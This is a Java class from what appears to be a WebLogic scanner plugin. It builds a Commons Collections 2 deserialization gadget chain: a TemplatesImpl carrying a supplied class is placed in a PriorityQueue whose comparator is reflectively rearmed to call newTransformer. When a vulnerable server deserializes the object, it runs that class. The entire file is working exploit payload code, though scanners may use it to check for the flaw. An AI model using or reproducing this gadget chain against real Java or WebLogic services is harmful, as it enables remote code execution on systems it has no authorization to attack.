package com.gbw.scanner.plugins.scripts.weblogic.payload;


import com.gbw.scanner.utils.Gadgets;
import com.gbw.scanner.utils.Reflections;
import org.apache.commons.collections.comparators.TransformingComparator;
import org.apache.commons.collections.functors.InvokerTransformer;

import java.util.PriorityQueue;


public class GBWCommonsCollections2 implements GBWEchoPayload<Object> {

    public Object getObject(String version,Class echoClass) throws Exception {
        final Object templates = Gadgets.createTemplatesImpl(echoClass);
        // mock method name until armed
        final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

        // create queue with numbers and basic comparator
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, new TransformingComparator(transformer));
        // stub data for replacement later
        queue.add(1);
        queue.add(1);

        // switch method called by comparator
        Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");

        // switch contents of queue
        final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = templates;
        queueArray[1] = 1;

        return queue;
    }

    @Override
    public String getName() {
        return "GBWCommonsCollections2";
    }
}
